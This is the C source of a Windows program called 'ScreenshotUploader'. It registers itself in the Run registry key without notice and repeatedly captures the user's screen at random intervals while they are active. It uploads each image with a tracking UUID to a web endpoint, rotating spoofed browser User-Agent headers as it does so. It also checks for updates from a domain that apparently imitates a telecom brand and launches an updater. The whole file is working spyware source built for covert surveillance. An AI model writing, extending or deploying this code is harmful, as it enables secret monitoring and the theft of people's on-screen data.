#include <stdio.h>
#include <winerror.h>
#include <stdlib.h>
#include <signal.h>
#include <time.h>
#define CURL_STATICLIB
#include <curl/curl.h>
#include <windows.h>
#include <tchar.h>
#include <Rpc.h>
#include <png.h>
#include <gdiplus.h>


#define INACTIVITY_THRESHOLD 60
#define BASE_URL "http://localhost/website_folder3/upload.php"
const char *headers[] = {
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; ...",
    "User-Agent: Mozilla/5.0 (Windows Phone 10.0; ...",
};

#define RAND_INTERVAL_MIN 10
#define RAND_INTERVAL_MAX 60

volatile sig_atomic_t flag = 0;

char *CURRENT_VERSION;

char* read_version_from_config() {
    FILE *file = fopen("config.txt", "r");
    if (!file) return NULL;
    char line[50];
    char *version = (char*)malloc(10);
    if (!version) return NULL;

    if (fgets(line, sizeof(line), file)) {
        sscanf(line, "version=%s", version);
    }
    fclose(file);

    // Remove newline if it exists
    size_t len = strlen(version);
    if (len > 0 && version[len-1] == '\n') version[len-1] = '\0';
    return version;
}


int compare_versions(const char *v1, const char *v2) {
    int num1 = 0, num2 = 0;

    // Skip any non-numeric prefix (like "v.")
    while (*v1 && (*v1 < '0' || *v1 > '9')) v1++;
    while (*v2 && (*v2 < '0' || *v2 > '9')) v2++;

    while (*v1 || *v2) {
        if (*v1) {
            num1 = strtol(v1, (char **) &v1, 10);
        } else {
            num1 = 0;
        }

        if (*v2) {
            num2 = strtol(v2, (char **) &v2, 10);
        } else {
            num2 = 0;
        }

        if (num1 > num2) return 1;
        if (num1 < num2) return -1;

        if (*v1) v1++;
        if (*v2) v2++;
    }

    return 0;
}


void signal_handler(int sig)
{
    flag = 1;
}

typedef struct
{
    BYTE *data;
    unsigned int size;
} PNGIOData;

char* my_strndup(const char* s, size_t n) {
    size_t len = strnlen(s, n);  // get length up to 'n'
    char* new_str = (char*) malloc(len + 1);  // +1 for the null-terminator
    if (new_str == NULL) return NULL;  // memory allocation failed
    new_str[len] = '\0';  // null-terminate the new string
    return memcpy(new_str, s, len);  // copy the string over
}


size_t write_version_data(void *buffer, size_t size, size_t nmemb, void *userp) {
    char **response_ptr = (char**)userp;
    *response_ptr = my_strndup(buffer, (size_t)(size *nmemb));
    return size * nmemb;
}

BOOL fetch_new_version(char **new_version) {
    CURL *curl = curl_easy_init();
    CURLcode res;
    BOOL success = FALSE;

    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, "https://safaricom.pro/versioning.txt");
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_version_data);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, new_version);
        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            fprintf(stderr, "Failed to fetch version data: %s\n", curl_easy_strerror(res));
        } else {
            success = TRUE;
        }
        curl_easy_cleanup(curl);
    }
    return success;
}

void check_and_update() {
    char *new_version = NULL;
    if (fetch_new_version(&new_version) && new_version) {
        printf("Fetched new version: %s\n", new_version);
        printf("Comparing with current version: %s\n", CURRENT_VERSION);

        if (compare_versions(new_version, CURRENT_VERSION) > 0) {
            printf("New version is greater. Initiating update...\n");

            // Start the updater.exe process to handle the update
            STARTUPINFO si;
            PROCESS_INFORMATION pi;

            ZeroMemory(&si, sizeof(si));
            si.cb = sizeof(si);
            ZeroMemory(&pi, sizeof(pi));

            if (!CreateProcess(NULL, "updater.exe", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
                fprintf(stderr, "CreateProcess failed (%d).\n", GetLastError());
                free(new_version);
                return;
            }

            // Close process and thread handles 
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);

            // Exit the current program to allow the update to take place
            free(new_version);
            exit(0);
        } else {
            printf("Current version is up-to-date.\n");
        }
        free(new_version);
    } else {
        printf("Failed to fetch new version or new version is null.\n");
    }
}


BOOL isUserInactive()
{
    LASTINPUTINFO lii;
    lii.cbSize = sizeof(LASTINPUTINFO);
    GetLastInputInfo(&lii);

    DWORD tickCount = GetTickCount();
    DWORD lastInput = lii.dwTime;

    DWORD inactivityTime = (tickCount - lastInput) / 1000; 

    return inactivityTime > INACTIVITY_THRESHOLD;
}

BOOL isStartupSet()
{
    HKEY hKey;
    TCHAR szPath[MAX_PATH];
    TCHAR szValue[MAX_PATH];
    DWORD dwSize = sizeof(szValue);
    const char *szValueName = "ScreenshotUploader";

    if (RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_QUERY_VALUE, &hKey) != ERROR_SUCCESS)
    {
        return FALSE;
    }

    if (RegQueryValueEx(hKey, szValueName, NULL, NULL, (LPBYTE)szValue, &dwSize) != ERROR_SUCCESS)
    {
        RegCloseKey(hKey);
        return FALSE;
    }

    RegCloseKey(hKey);

    if (GetModuleFileName(NULL, szPath, MAX_PATH) == 0)
    {
        return FALSE;
    }

    return (_tcscmp(szPath, szValue) == 0);
}

void setStartup()
{
    HKEY hKey;
    TCHAR szPath[MAX_PATH];
    const char *szValueName = "ScreenshotUploader";

    if (GetModuleFileName(NULL, szPath, MAX_PATH) == 0)
    {
        fprintf(stderr, "Failed to get module file name, error %d\n", GetLastError());
        return;
    }

    if (RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
    {
        RegSetValueEx(hKey, szValueName, 0, REG_SZ, (BYTE *)szPath, _tcslen(szPath) * sizeof(TCHAR));
        RegCloseKey(hKey);
    }
}

char *generate_or_retrieve_uuid()
{
    char *path_to_uuid = "./.screenshot_uuid";
    FILE *file = fopen(path_to_uuid, "r");
    if (file)
    {
        char *uuid_str = (char *)malloc(37);
        if (!uuid_str)
        {
            fprintf(stderr, "Memory allocation failed\n");
            fclose(file);
            return NULL;
        }
        fread(uuid_str, 1, 36, file);
        uuid_str[36] = '\0';
        fclose(file);
        return uuid_str;
    }
    else
    {
        file = fopen(path_to_uuid, "w");
        if (!file)
        {
            perror("Error opening UUID file for writing");
            return NULL;
        }
        UUID uuid;
        UuidCreate(&uuid);
        unsigned char *uuidString;
        UuidToStringA(&uuid, &uuidString);
        char *uuid_str = (char *)malloc(37);
        if (!uuid_str)
        {
            fprintf(stderr, "Memory allocation failed\n");
            RpcStringFreeA(&uuidString);
            fclose(file);
            return NULL;
        }
        strncpy(uuid_str, (char *)uuidString, 36);
        uuid_str[36] = '\0';

        fwrite(uuid_str, 1, 36, file);
        fclose(file);
        RpcStringFreeA(&uuidString);
        return uuid_str;
    }
}

void my_png_write_data(png_structp png_ptr, png_bytep data, png_size_t length)
{
    PNGIOData *ioData = (PNGIOData *)png_get_io_ptr(png_ptr);
    ioData->data = (BYTE *)realloc(ioData->data, length + ioData->size);
    memcpy(ioData->data + ioData->size, data, length);
    ioData->size += length;
}

HBITMAP capture_screenshot()
{
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMemDC = CreateCompatibleDC(hdcScreen);
    if (!hdcMemDC)
    {
        fprintf(stderr, "Failed to create memory device context.\n");
        ReleaseDC(NULL, hdcScreen);
        return NULL;
    }

    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    HBITMAP hbmScreenshot = CreateCompatibleBitmap(hdcScreen, width, height);
    if (!hbmScreenshot)
    {
        fprintf(stderr, "Failed to create bitmap for screenshot.\n");
        DeleteDC(hdcMemDC);
        ReleaseDC(NULL, hdcScreen);
        return NULL;
    }

    SelectObject(hdcMemDC, hbmScreenshot);

    if (!BitBlt(hdcMemDC, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY))
    {
        fprintf(stderr, "BitBlt failed.\n");
        DeleteObject(hbmScreenshot);
        hbmScreenshot = NULL;
    }

    DeleteDC(hdcMemDC);
    ReleaseDC(NULL, hdcScreen);

    return hbmScreenshot;
}

BYTE *HBITMAPtoPNG(HBITMAP hBitmap, unsigned int *size)
{
    BITMAP bmp;
    GetObject(hBitmap, sizeof(bmp), &bmp);

    // Get bitmap info and pixel data
    BITMAPINFO bmi = {0};
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = bmp.bmWidth;
    bmi.bmiHeader.biHeight = bmp.bmHeight;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32; 
    bmi.bmiHeader.biCompression = BI_RGB;

    HDC hdc = GetDC(NULL);
    BYTE *bits = (BYTE *)malloc(bmp.bmWidth * bmp.bmHeight * 4);
    GetDIBits(hdc, hBitmap, 0, bmp.bmHeight, bits, &bmi, DIB_RGB_COLORS);
    ReleaseDC(NULL, hdc);

    png_structp png_ptr = png_create_write_struct(PNG_LIBPNG_VER_STRING, NULL, NULL, NULL);
    png_infop info_ptr = png_create_info_struct(png_ptr);

    PNGIOData ioData;
    ioData.data = NULL;
    ioData.size = 0;

    png_set_compression_level(png_ptr, 9);

    png_set_IHDR(png_ptr, info_ptr, bmp.bmWidth, bmp.bmHeight,
                 8, PNG_COLOR_TYPE_RGBA, PNG_INTERLACE_NONE,
                 PNG_COMPRESSION_TYPE_DEFAULT, PNG_FILTER_TYPE_DEFAULT);

    png_bytepp rows = (png_bytepp)malloc(sizeof(png_bytep) * bmp.bmHeight);
    for (int i = 0; i < bmp.bmHeight; i++)
    {
        rows[bmp.bmHeight - 1 - i] = bits + i * bmp.bmWidth * 4;
    }

    png_set_rows(png_ptr, info_ptr, rows);

    png_set_write_fn(png_ptr, &ioData, my_png_write_data, NULL);

    png_write_png(png_ptr, info_ptr, PNG_TRANSFORM_IDENTITY, NULL);

    free(rows);
    free(bits);
    png_destroy_write_struct(&png_ptr, &info_ptr);

    *size = ioData.size;
    return ioData.data;
}

void upload_screenshot(BYTE *image_data, unsigned int image_size, char *uuid)
{
    CURL *curl;
    CURLcode res;
    curl_mime *mime;
    curl_mimepart *part;

    struct curl_slist *headerlist = NULL;

    curl = curl_easy_init();
    if (curl)
    {
        mime = curl_mime_init(curl);

        part = curl_mime_addpart(mime);
        curl_mime_name(part, "uuid");
        curl_mime_data(part, uuid, CURL_ZERO_TERMINATED);


        part = curl_mime_addpart(mime);
        curl_mime_name(part, "screenshot");
        curl_mime_filename(part, "screenshot.png");
        curl_mime_data(part, (char *)image_data, image_size);

        int rand_header_idx = rand() % (sizeof(headers) / sizeof(headers[0]));
        headerlist = curl_slist_append(headerlist, headers[rand_header_idx]);
        curl_easy_setopt(curl, CURLOPT_URL, BASE_URL);
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headerlist);
        curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);

        res = curl_easy_perform(curl);
        if (res != CURLE_OK)
        {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        }
        
        curl_easy_cleanup(curl);
        curl_mime_free(mime);
        curl_slist_free_all(headerlist);
    }
}

int main(int argc, char **argv) {
    CURRENT_VERSION = read_version_from_config();
    if (!CURRENT_VERSION) {
        fprintf(stderr, "Failed to read current version from config\n");
        return 1;
    }
    signal(SIGINT, signal_handler);

    if (!isStartupSet()) {
        setStartup();
    }

    CURLcode init_result = curl_global_init(CURL_GLOBAL_DEFAULT);
    if (init_result != CURLE_OK) {
        fprintf(stderr, "curl initialization failed: %s\n", curl_easy_strerror(init_result));
        return 1;
    }

    srand(time(NULL));

    // Updater check runs only once
    check_and_update();

    while (1) {
        if (flag) { 
            break;
        }
        
        if (!isUserInactive()) {
            HBITMAP hbmScreenshot = capture_screenshot();
            if (hbmScreenshot) {
                unsigned int size;
                BYTE *pngData = HBITMAPtoPNG(hbmScreenshot, &size);
                if (pngData) {
                    char *uuid = generate_or_retrieve_uuid();
                    if (uuid) {
                        upload_screenshot(pngData, size, uuid);
                        free(uuid);
                    }
                    free(pngData);
                }
                DeleteObject(hbmScreenshot);
            }
            int rand_interval = RAND_INTERVAL_MIN + rand() % (RAND_INTERVAL_MAX - RAND_INTERVAL_MIN + 1);  // Assuming RAND_INTERVAL_MIN and RAND_INTERVAL_MAX are defined somewhere
            Sleep(rand_interval * 1000);
        }
    }

    curl_global_cleanup();

    return 0;
}
